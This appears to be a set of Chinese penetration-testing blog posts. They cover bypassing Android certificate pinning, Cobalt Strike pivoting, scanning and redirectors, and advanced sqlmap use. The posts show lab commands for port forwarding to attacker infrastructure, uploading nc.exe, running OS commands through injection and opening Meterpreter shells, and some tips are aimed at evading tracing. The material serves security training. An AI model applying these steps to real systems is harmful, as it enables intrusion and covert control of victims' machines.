<p>Android 5.0以下版本使用此链接：</p>
<p><a href="http://forum.xda-developers.com/showthread.php?t=3034811" target="_blank" rel="noopener">http://forum.xda-developers.com/showthread.php?t=3034811</a></p>
<p>下载后使用第三方recovery刷入即可，由于Android 7以上安装有证书强校验机制，需要在Xposed狂街内安装JustTrustMe：</p>
<p><a href="https://github.com/Fuzion24/JustTrustMe/releases" target="_blank" rel="noopener">https://github.com/Fuzion24/JustTrustMe/releases</a></p>
<p>绕过证书模块。</p>
<p>其他Xposed证书绕过模块</p>
<p><a href="http://repo.xposed.info/module/mobi.acpm.sslunpinning" target="_blank" rel="noopener">http://repo.xposed.info/module/mobi.acpm.sslunpinning</a></p>
<p>此证书绕过模式未测试</p>
<h2 id="注"><a href="#注" class="headerlink" title="注"></a>注</h2><p>现阶段如果需进行手机root进行安全测试，宜选择一加和小米等热门机型，有丰富的root资源和教程。Google的Pixel系类不适合日常使用，华为等手机已经关闭解锁通道，进行root将会十分困难。</p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>app</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike之端口转发</title>
    <url>/2019/12/18/cs%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    <content><![CDATA[<p>本文主要记录cs端口转发</p><p>拓扑图如下</p><p><img src="//choge.top/2019/12/18/cs之端口转发/cs-1.png" alt="cs-1-1"></p><h2 id="获取内网其他主机cs会话（方式一）"><a href="#获取内网其他主机cs会话（方式一）" class="headerlink" title="获取内网其他主机cs会话（方式一）"></a>获取内网其他主机cs会话（方式一）</h2><p>接上一篇博文Cobalt Strike之socks代理</p><p>建立代理后利用msf的ms17-010漏洞利用模块进行获取meterperter</p><p><img src="//choge.top/2019/12/18/cs之端口转发/cs-2.png" alt="cs-2"></p><p>meterpreter获取失败，理想状态为获取主机(172.16.237.158)meterpreter后，利用cs生成的木马通过meterpreter上传到主机执行获取cs的会话，由于meterpreter未获取成功，也不进行其他尝试，后续实验通过cs生成木马直接在目标机运行来模拟通过meterpreter执行</p><a id="more"></a>






<p><img src="//choge.top/2019/12/18/cs之端口转发/cs-3.png" alt="cs-3"></p>
<p>在cs中进行端口转发<code>rportfwd 8082 teamserverip 8082</code>，讲ip为172.16.237.156的8082端口转发到teamserver的8082端口</p>
<p><img src="//choge.top/2019/12/18/cs之端口转发/cs-4.png" alt="cs-4"></p>
<p>同时建立如下监听，host为172.16.237.156</p>
<p><img src="//choge.top/2019/12/18/cs之端口转发/cs-5.png" alt="cs-5"></p>
<p>重定向ip也设置为172.16.237.156</p>
<p><img src="//choge.top/2019/12/18/cs之端口转发/cs-6.png" alt="cs-6"></p>
<p>重新生成木马文件</p>
<p><img src="//choge.top/2019/12/18/cs之端口转发/cs-7.png" alt="cs-7"></p>
<p>在主机172.16.237.158上运行后成功获取会话</p>
<p><img src="//choge.top/2019/12/18/cs之端口转发/cs-8.png" alt="cs-8"></p>
<h2 id="获取内网其他主机cs会话（方式二）"><a href="#获取内网其他主机cs会话（方式二）" class="headerlink" title="获取内网其他主机cs会话（方式二）"></a>获取内网其他主机cs会话（方式二）</h2><p>以下路径设置会话的监听器</p>
<p><img src="//choge.top/2019/12/18/cs之端口转发/cs-9.png" alt="cs-9"></p>
<p>设置host为172.16.237.156并点击…</p>
<p><img src="//choge.top/2019/12/18/cs之端口转发/cs-10.png" alt="cs-10"></p>
<p>选择要监听的会话</p>
<p><img src="//choge.top/2019/12/18/cs之端口转发/cs-11.png" alt="cs-11"></p>
<p>此时新增一个172-2的监听器，此监听器没有beacons信息，因为是建立在已有会话上的</p>
<p><img src="//choge.top/2019/12/18/cs之端口转发/cs-12.png" alt="cs-12"></p>
<p>以下路径重新生成木马</p>
<p><img src="//choge.top/2019/12/18/cs之端口转发/cs-13.png" alt="cs-13"></p>
<p>选择监听器重新生成木马，此生成木马比较大，因为已包含shellcode，不需要在连接teamserver进行下载</p>
<p><img src="//choge.top/2019/12/18/cs之端口转发/cs-14.png" alt="cs-14"></p>
<p>在172.16.237.158机器执行后成功上线，下图中external中会有特殊符号显示，说明是通过主机172.16.237.156上线的，且此机器last，直到成功执行命令后才重新开始计数</p>
<p><img src="//choge.top/2019/12/18/cs之端口转发/cs-15.png" alt="cs-15"></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>此端口转发操作还可以讲需要的端口转发到外网或者做其他操作</p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike之socks代理</title>
    <url>/2019/12/18/cs%E4%B9%8Bsocks%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>本文主要记录cs的socks代理操作，拓扑图如下</p><p><img src="//choge.top/2019/12/18/cs之socks代理/cs-1.png" alt="cs-1"></p><h2 id="建立socks4a代理"><a href="#建立socks4a代理" class="headerlink" title="建立socks4a代理"></a>建立socks4a代理</h2><p>以下路径可开启socks代理</p><p><img src="//choge.top/2019/12/18/cs之socks代理/cs-2.png" alt="cs-2"></p><p>端口为8832</p><p><img src="//choge.top/2019/12/18/cs之socks代理/cs-3.png" alt></p><p>在软件Proxifier上设置teamserverIP和端口</p><p><img src="//choge.top/2019/12/18/cs之socks代理/cs-4.png" alt="cs-4"></p><p>注意下图creat可以设置代理链，设置多个代理链多几层转发可较好得隐蔽自己</p><p><img src="//choge.top/2019/12/18/cs之socks代理/cs-5.png" alt="cs-5"></p><p>停止socks代理可使用<code>socks stop</code>命令</p><p><img src="//choge.top/2019/12/18/cs之socks代理/cs-6.png" alt="cs-6"></p><h2 id="nmap通过socks进行扫描"><a href="#nmap通过socks进行扫描" class="headerlink" title="nmap通过socks进行扫描"></a>nmap通过socks进行扫描</h2><a id="more"></a>











<p>建立规则，名称为nmap，目标ip设置为172.16.237.*，对应为受害机器的内网网段</p>
<p><img src="//choge.top/2019/12/18/cs之socks代理/cs-7.png" alt="cs-7"></p>
<p>设置成功如下所示</p>
<p><img src="//choge.top/2019/12/18/cs之socks代理/cs-8.png" alt="cs-8"></p>
<p>在本机启动nmap进行扫描，使用<code>-Pn</code>参数时默认所有主机存活且需要扫描的端口为开放</p>
<p><img src="//choge.top/2019/12/18/cs之socks代理/cs-9.png" alt="cs-9"></p>
<p>需要通过Proxifier代理记录查看主机和端口是否真的开放和存活，如下所示为开放445的主机ip</p>
<p><img src="//choge.top/2019/12/18/cs之socks代理/cs-10.png" alt="cs-10"></p>
<h2 id="MSF使用socks4a代理"><a href="#MSF使用socks4a代理" class="headerlink" title="MSF使用socks4a代理"></a>MSF使用socks4a代理</h2><p>以下路径进入Proxy Pivots设置信息</p>
<p><img src="//choge.top/2019/12/18/cs之socks代理/cs-11.png" alt="cs-11"></p>
<p>查看Tunnel信息</p>
<p><img src="//choge.top/2019/12/18/cs之socks代理/cs-12.png" alt="cs-12"></p>
<p>可以在msf中设置全局变量<code>setg Proxies socks4:teamserverip:8832</code>即可使用此socks代理</p>
<p><img src="//choge.top/2019/12/18/cs之socks代理/cs-13.png" alt="cs-13"></p>
<p>在msf<code>auxiliary(scanner/smb/smb_version)</code>中设置代理</p>
<p><img src="//choge.top/2019/12/18/cs之socks代理/cs-14.png" alt="cs-14"></p>
<p>此时切换到<code>auxiliary(scanner/mysql/mysql_login)</code>中查看也已设置代理，说明设置成功</p>
<p><img src="//choge.top/2019/12/18/cs之socks代理/cs-15.png" alt="cs-15"></p>
<p>再次进入<code>auxiliary(scanner/smb/smb_version)</code>模块设置目标ip段进行内网smb扫描</p>
<p><img src="//choge.top/2019/12/18/cs之socks代理/cs-16.png" alt="cs-16"></p>
<p>扫描成功，发现目标机器</p>
<p><img src="//choge.top/2019/12/18/cs之socks代理/cs-17.png" alt="cs-17"></p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike之端口扫描</title>
    <url>/2019/12/18/cs%E4%B9%8B%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<p>本文主要记录cs的端口扫描功能</p><p>在获取内网主机之后需要通过内网主机来发现其他主机和端口开发情况，此时需要使用cs的端口扫描功能。</p><p>以下路径进行端口扫描</p><p><img src="//choge.top/2019/12/18/cs之端口扫描/cs-1.png" alt="cs-1"></p><p>Potrs设置需要扫描的端口，Max sockets设置进程数，一般设置为200，Discovery有arp，icmp，none三种扫描模式，其中none选项默认所有机器都是存活，再对设置端口进行扫描。</p><a id="more"></a>




<p><img src="//choge.top/2019/12/18/cs之端口扫描/cs-2.png" alt="cs-2"></p>
<p>一般选择icmp进行扫描</p>
<p><img src="//choge.top/2019/12/18/cs之端口扫描/cs-3.png" alt="cs-3"></p>
<p>扫描时会有命令展示，可以使用<code>portscan ip段 端口 协议 线程</code>形式进行命令扫描</p>
<p><img src="//choge.top/2019/12/18/cs之端口扫描/cs-4.png" alt="cs-4"></p>
<p>部分扫描结果如下</p>
<p><img src="//choge.top/2019/12/18/cs之端口扫描/cs-5.png" alt="cs-5"></p>
<p>可以通过View-Targes路径对扫描结果进行展示</p>
<p><img src="//choge.top/2019/12/18/cs之端口扫描/cs-6.png" alt="cs-6"></p>
<p>展示后可通过不同类型进行排序</p>
<p><img src="//choge.top/2019/12/18/cs之端口扫描/cs-7.png" alt="cs-7"></p>
<p>全部选择右键选择Services可以展示端口，banner等信息。</p>
<p><img src="//choge.top/2019/12/18/cs之端口扫描/cs-8.png" alt="cs-8"></p>
<p>展示端口，bannner等信息。</p>
<p><img src="//choge.top/2019/12/18/cs之端口扫描/cs-9.png" alt="cs-9"></p>
<p>在Targets处也可以用Note进行文本标记</p>
<p><img src="//choge.top/2019/12/18/cs之端口扫描/cs-10.png" alt="cs-10"></p>
<p>如标记某台主机为RDP</p>
<p><img src="//choge.top/2019/12/18/cs之端口扫描/cs-11.png" alt="cs-11"></p>
<p><img src="//choge.top/2019/12/18/cs之端口扫描/cs-12.png" alt="cs-12"></p>
<p><code>portscan 192.168.16.0/8 3389 icmp 100</code>扫描大量ip，<code>jobs</code>查看当前进程JID，JID为2。</p>
<p><img src="//choge.top/2019/12/18/cs之端口扫描/cs-13.png" alt="cs-13"></p>
<p><code>jobkill 2</code>可以停止JTD为2的任务。</p>
<p><img src="//choge.top/2019/12/18/cs之端口扫描/cs-14.png" alt="cs-14"></p>
<p>再次使用<code>jobs</code>查看，任务已不存在。</p>
<p><img src="//choge.top/2019/12/18/cs之端口扫描/cs-15.png" alt="cs-15"></p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike之重定向上线</title>
    <url>/2019/12/17/cs%E4%B9%8B%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%8A%E7%BA%BF/</url>
    <content><![CDATA[<p>本文主要介绍cs的重定向上线，并模拟内网和外网进行重定向上线</p><p><img src="//choge.top/2019/12/17/cs之重定向上线/cs-1.png" alt="cs-1"></p><p>重定向上线主要通过Redirectors来配置，当图中r2，r3等Beacon一旦发生堵塞，还能通过r4获取Beacon，同时也给溯源到真实teamserver地址增加难度。</p><h2 id="域名重定向上线"><a href="#域名重定向上线" class="headerlink" title="域名重定向上线"></a>域名重定向上线</h2><p>根据重定向原理，可进行多个域名转发上线，如下图。</p><p><img src="//choge.top/2019/12/17/cs之重定向上线/cs-2.png" alt="cs-2"></p><p>图中只需domain1，domain2和domain3的vps端口转发到cs配置的监听端口即可，如cs配置的监听端口为80，只需将doaminIP:80转发到teamserverIP:80即可，最好使用域名上线，隐蔽性强。</p><a id="more"></a>





<p>##内网重定向上线</p>
<p><img src="//choge.top/2019/12/17/cs之重定向上线/cs-3.png" alt="cs-3"></p>
<p>此种情况可以在victim1不出网的情况下使用，如果发现victim1和victim2能连通，重定向设置只要将victim2内网ip的转发到teamserver的端口即可，假设cs设置监听端口为80，设置为victim2ip:80转发到teamserverip:80。</p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>实战拓扑图如下</p>
<p><img src="//choge.top/2019/12/17/cs之重定向上线/cs-4.png" alt="cs-4"></p>
<p>修改name为vps-http-81的监听器，此监听器监听端口为81</p>
<p><img src="//choge.top/2019/12/17/cs之重定向上线/cs-5.png" alt="cs-5"></p>
<p>此处可以设置多个重定向服务器，图中设置为先通过192.168.16.199的IP去获取Beacon，如果192.168.16.199的IP通，则会通过第二个外网IP对进行Beacon获取。</p>
<p>设置完重定向后需要重新生成木马文件，64位系统需要勾选<code>Use x64 payliad</code>。</p>
<p><img src="//choge.top/2019/12/17/cs之重定向上线/cs-6.png" alt="cs-6"></p>
<p>在victim2中设置端口转发，使用工具为nb-windows-amd64.exe</p>
<p><code>nb-windows-amd64.exe -tran 81 VPSIP:81</code></p>
<p>此时判断victim1是否可出网，可在victim1浏览器中访问192.168.16.199:81后观察cs中Web Log是否有记录，下图有访问记录，说明转发设置成功。</p>
<p><img src="//choge.top/2019/12/17/cs之重定向上线/cs-7.png" alt="cs-7"></p>
<p>运行生成的木马，发现流量经过192.168.16.199</p>
<p><img src="//choge.top/2019/12/17/cs之重定向上线/cs-8.png" alt="cs-8"></p>
<p>上线成功</p>
<p><img src="//choge.top/2019/12/17/cs之重定向上线/cs-9.png" alt="cs-9"></p>
<p>如果192.168.16.199的转发被掐断，还能通过通过第二个外网IP对进行上线。</p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap之使用进阶</title>
    <url>/2019/12/10/sqlmap%E4%B9%8B%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>本文主要介绍sqlmap使用进阶，实验环境sqli_lab</p><h2 id="设定基本测试语句"><a href="#设定基本测试语句" class="headerlink" title="设定基本测试语句"></a>设定基本测试语句</h2><p>进入sqlmap对sqli_lab第一关进行测试。</p><p>测试语句：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -v3 -u http://127.0.0.1/Less-1/?id=1 --user-agent=websecurity --threads=5 -p id --level 3 --technigue=E --current-user --flush-session</span><br></pre></td></tr></table></figure><a id="more"></a>




<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-1.png" alt="sqlmap-1"></p>
<p>结果如下</p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-2.png" alt="sqlmap-2"></p>
<p>对基本测试语句进行分解</p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-3.png" alt="sqlmap-3"></p>
<p>默认配置文件路径<code>sqlmap\sqlmap.conf</code>，一般测试按照sqlmap.conf中的配置进行测试</p>
<p>将设定的测试语句进行保存。</p>
<p><code>--save=demo.conf</code></p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-4.png" alt="sqlmap-4"></p>
<p>目录下保存了demo.conf</p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-5.png" alt="sqlmap-5"></p>
<p>再次对sqli_lab第一关进行注册测试可使用命令<code>python2 sqlmap.py -c demo.conf</code></p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-6.png" alt="sqlmap-6"></p>
<p>查看demo.conf文件如下图，也可以对demo.conf进行修改，然后进行测试</p>
<img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-7.png" alt="sqlmap-7" style="zoom:50%;">

<h2 id="Sqlmap注入流程"><a href="#Sqlmap注入流程" class="headerlink" title="Sqlmap注入流程"></a>Sqlmap注入流程</h2><p>sql注入流程如下</p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-8.png" alt="sqlmap-8"></p>
<h2 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h2><p>配置代理使用命令<code>--proxy=http://127.0.0.1:8000</code></p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-9.png" alt="sqlmap-9"></p>
<p>设置代理后可以在sqlmap注入过程中在burpsuit中查看payload</p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-10.png" alt="sqlmap-10"></p>
<h2 id="修改Payload"><a href="#修改Payload" class="headerlink" title="修改Payload"></a>修改Payload</h2><p>将sqli_lab第一关代码修改如下</p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-11.png" alt="sqlmap-11"></p>
<p>使用语句<code>python2 sqlmap.py -u http://127.0.0.1/Less-1/?id=1 --technigue=U --flush-session</code>进行注入无法获取数据</p>
<p>此时需要使用<code>--prefix</code>闭合前面的符号，<code>--suffix</code> 注释、闭合后面的数据进行注入</p>
<p><code>python2 sqlmap.py -u http://127.0.0.1/Less-1/?id=1 --technigue=U --flush-session --prefix=&quot;))))&quot; --suffix=&quot;-- hhh&quot;</code></p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-12.png" alt="sqlmap-12"></p>
<p>注入结果如下</p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-13.png" alt="sqlmap-13"></p>
<h2 id="需要注意的情况"><a href="#需要注意的情况" class="headerlink" title="需要注意的情况"></a>需要注意的情况</h2><h3 id="需要用到-号的时候"><a href="#需要用到-号的时候" class="headerlink" title="需要用到*号的时候"></a>需要用到*号的时候</h3><p>1、url中的值，sqlmap默认不注入，需要*指定，如伪静态数据</p>
<p>2、json格式，需要*号进行</p>
<p>3、在默认level1时，可以使用*对特定的请求头做注入</p>
<h3 id="–user-agent"><a href="#–user-agent" class="headerlink" title="–user-agent"></a>–user-agent</h3><p>使用sqlmap时默认情况下user-agent值如下所示，可能会被waf拦截，可以使用<code>--user-agent</code>对user-agent进行指定</p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-14.png" alt="sqlmap-14"></p>
<h3 id="Sqlmap-l"><a href="#Sqlmap-l" class="headerlink" title="Sqlmap -l"></a>Sqlmap -l</h3><p><code>sqlmap -l file</code>，file文件按如图所示设置勾选红框中proxy请求获取文件</p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-15.png" alt="sqlmap-15"></p>
<h3 id="–no-cast"><a href="#–no-cast" class="headerlink" title="–no-cast"></a>–no-cast</h3><p>关闭cast()函数的使用，对于一些版本的mysql服务器需要关闭此选项，不然会报错。</p>
<h3 id="–no-escape"><a href="#–no-escape" class="headerlink" title="–no-escape"></a>–no-escape</h3><p>可以关闭char()减少载荷</p>
<h3 id="–hex"><a href="#–hex" class="headerlink" title="–hex"></a>–hex</h3><p>有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免</p>
<h2 id="修改payload"><a href="#修改payload" class="headerlink" title="修改payload"></a>修改payload</h2><p>检测payload位置在/sqlmap/data/xml/payloads中</p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-16.png" alt="sqlmap-16"></p>
<p>查看boolean_blind.xml</p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-17.png" alt="sqlmap-17"></p>
<p>返回到/sqlmap/data/xml/下查看boundaries.xml</p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-18.png" alt="sqlmap-18"></p>
<p>sql注入过程中为boundaries.xml和boolean_blind.xml相互配合，如下图所示</p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-19.png" alt="sqlmap-19"></p>
<p><code>payload=where+boundary.prefix+test.payload+boundary.suffix</code></p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-20.png" alt="sqlmap-20"></p>
<p>修改boundaries.xml文件加入如下代码</p>
<pre><code>&lt;boundary&gt;
    &lt;level&gt;1&lt;/level&gt;
    &lt;clause&gt;1&lt;/clause&gt;
    &lt;where&gt;1,2&lt;/where&gt;
    &lt;ptype&gt;1&lt;/ptype&gt;
    &lt;prefix&gt;))))&lt;/prefix&gt;
    &lt;suffix&gt;-- hh&lt;/suffix&gt;
&lt;/boundary&gt;</code></pre><p>加入代码后尝试使用<code>python2 sqlmap.py -u http://127.0.0.1/Less-1/?id=1 --flush-session --technique=U</code></p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-21.png" alt="sqlmap-21"></p>
<p>可以注入出结果，结果如下</p>
<p><img src="//choge.top/2019/12/10/sqlmap之进阶使用/sqlmap-22.png" alt="sqlmap-22"></p>
<p>参考：网易云Web安全进阶</p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap之使用手册（下）</title>
    <url>/2019/12/08/Sqlmap%E4%B9%8B%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/</url>
    <content><![CDATA[<p>本文接Sqlmap之使用手册（上）</p><h2 id="其他高级"><a href="#其他高级" class="headerlink" title="其他高级"></a>其他高级</h2><h3 id="用户自定义函数注入"><a href="#用户自定义函数注入" class="headerlink" title="用户自定义函数注入"></a>用户自定义函数注入</h3><p>参数：<code>--udf-inject,--shared-lib</code></p><p>你可以通过编译<code>MySQL</code>注入你自定义的函数<code>（UDFs）或PostgreSQL</code>在<code>windows</code>中共享库，<code>DLL</code>，或者<code>Linux/Unix</code>中共享对象，</p><p><code>sqlmap</code>将会问你一些问题，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，<code>sqlmap</code>将会移除它们。</p><a id="more"></a>



<h3 id="系统文件操作"><a href="#系统文件操作" class="headerlink" title="系统文件操作"></a>系统文件操作</h3><h4 id="从数据库服务器中读取文件"><a href="#从数据库服务器中读取文件" class="headerlink" title="从数据库服务器中读取文件"></a>从数据库服务器中读取文件</h4><p>参数：<code>--file-read</code></p>
<p>当数据库为<code>MySQL，PostgreSQL</code>或<code>Microsoft SQLServer</code>，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。</p>
<p>列举一个Microsoft SQL Server 2005的例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python sqlmap.py -u <span class="string">"http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther"</span> \</span></span><br><span class="line">--file-read "C:/example.exe" -v 1</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server</span><br><span class="line">web server operating system: Windows 2000</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 6.0, ASP</span><br><span class="line">back-end DBMS: Microsoft SQL Server 2005</span><br><span class="line"></span><br><span class="line">[hh:mm:50] [INFO] fetching file: 'C:/example.exe'</span><br><span class="line">[hh:mm:50] [INFO] the SQL query provided returns 3 entries</span><br><span class="line">C:/example.exe file saved to:    '/software/sqlmap/output/192.168.136.129/files/C__example.exe'</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls -l output/192.168.136.129/files/C__example.exe </span></span><br><span class="line">-rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C__example.exe</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> file output/192.168.136.129/files/C__example.exe </span></span><br><span class="line">output/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel</span><br><span class="line">80386 32-bit</span><br></pre></td></tr></table></figure>

<h4 id="把文件上传到数据库服务器中"><a href="#把文件上传到数据库服务器中" class="headerlink" title="把文件上传到数据库服务器中"></a>把文件上传到数据库服务器中</h4><p>参数：<code>--file-write,--file-dest</code></p>
<p>当数据库为<code>MySQL，PostgreSQL或Microsoft SQLServer</code>，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。</p>
<p>列举一个MySQL的例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file /software/nc.exe.packed </span></span><br><span class="line">/software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls -l /software/nc.exe.packed</span></span><br><span class="line">-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> python sqlmap.py -u <span class="string">"http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1"</span> --file-write \</span></span><br><span class="line">"/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:29] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Windows 2003 or 2008</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727</span><br><span class="line">back-end DBMS: MySQL &amp;gt;= 5.0.0</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">do you want confirmation that the file 'C:/WINDOWS/Temp/nc.exe' has been successfully </span><br><span class="line">written on the back-end DBMS file system? [Y/n] y</span><br><span class="line">[hh:mm:52] [INFO] retrieved: 31744</span><br><span class="line">[hh:mm:52] [INFO] the file has been successfully written and its size is 31744 bytes, </span><br><span class="line">same size as the local file '/software/nc.exe.packed'</span><br></pre></td></tr></table></figure>

<h4 id="运行任意操作系统命令"><a href="#运行任意操作系统命令" class="headerlink" title="运行任意操作系统命令"></a>运行任意操作系统命令</h4><p>参数：<code>--os-cmd,--os-shell</code></p>
<p>当数据库为<code>MySQL，PostgreSQL或Microsoft SQL Server</code>，并且当前用户有权限使用特定的函数。</p>
<p>在<code>MySQL、PostgreSQL，sqlmap</code>上传一个二进制库，包含用户自定义的函数，<code>sys_exec()和sys_eval()</code>。</p>
<p>那么他创建的这两个函数可以执行系统命令。在<code>Microsoft SQLServer，sqlmap</code>将会使用<code>xp_cmdshell</code>存储过程，</p>
<p>如果被禁<code>（在Microsoft SQL Server2005</code>及以上版本默认禁制），<code>sqlmap</code>会重新启用它，如果不存在，会自动创建。</p>
<p>列举一个PostgreSQL的例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python sqlmap.py -u <span class="string">"http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1"</span> \</span></span><br><span class="line">--os-cmd id -v 1</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">web application technology: PHP 5.2.6, Apache 2.2.9</span><br><span class="line">back-end DBMS: PostgreSQL</span><br><span class="line">[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system</span><br><span class="line">[hh:mm:12] [INFO] the back-end DBMS operating system is Linux</span><br><span class="line">[hh:mm:12] [INFO] testing if current user is DBA</span><br><span class="line">[hh:mm:12] [INFO] detecting back-end DBMS version from its banner</span><br><span class="line">[hh:mm:12] [INFO] checking if UDF 'sys_eval' already exist</span><br><span class="line">[hh:mm:12] [INFO] checking if UDF 'sys_exec' already exist</span><br><span class="line">[hh:mm:12] [INFO] creating UDF 'sys_eval' from the binary UDF file</span><br><span class="line">[hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF file</span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] y</span><br><span class="line">command standard output:    'uid=104(postgres) gid=106(postgres) groups=106(postgres)'</span><br><span class="line"></span><br><span class="line">[hh:mm:19] [INFO] cleaning up the database management system</span><br><span class="line">do you want to remove UDF 'sys_eval'? [Y/n] y</span><br><span class="line">do you want to remove UDF 'sys_exec'? [Y/n] y</span><br><span class="line">[hh:mm:23] [INFO] database management system cleanup finished</span><br><span class="line">[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system can </span><br><span class="line">only be deleted manually</span><br></pre></td></tr></table></figure>

<p>用<code>--os-shell</code>参数也可以模拟一个真实的<code>shell</code>，可以输入你想执行的命令。</p>
<p>当不能执行多语句的时候（比如php或者asp的后端数据库为<code>MySQL</code>时），仍然可能使用<code>INTOOUTFILE</code>写进可写目录，来创建一个web后门。支持的语言：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、ASP</span><br><span class="line">2、ASP.NET</span><br><span class="line">3、JSP</span><br><span class="line">4、PHP</span><br></pre></td></tr></table></figure>

<h4 id="Meterpreter配合使用"><a href="#Meterpreter配合使用" class="headerlink" title="Meterpreter配合使用"></a>Meterpreter配合使用</h4><p>参数：<code>--os-pwn,--os-smbrelay,--os-bof,--priv-esc,--msf-path,--tmp-path</code></p>
<p>当数据库为<code>MySQL，PostgreSQL或Microsoft SQLServer</code>，并且当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立<code>TCP</code>连接，</p>
<p>这个连接可以是一个交互式命令行的<code>Meterpreter</code>会话，<code>sqlmap</code>根据<code>Metasploit</code>生成<code>shellcode</code>，并有四种方式执行它：</p>
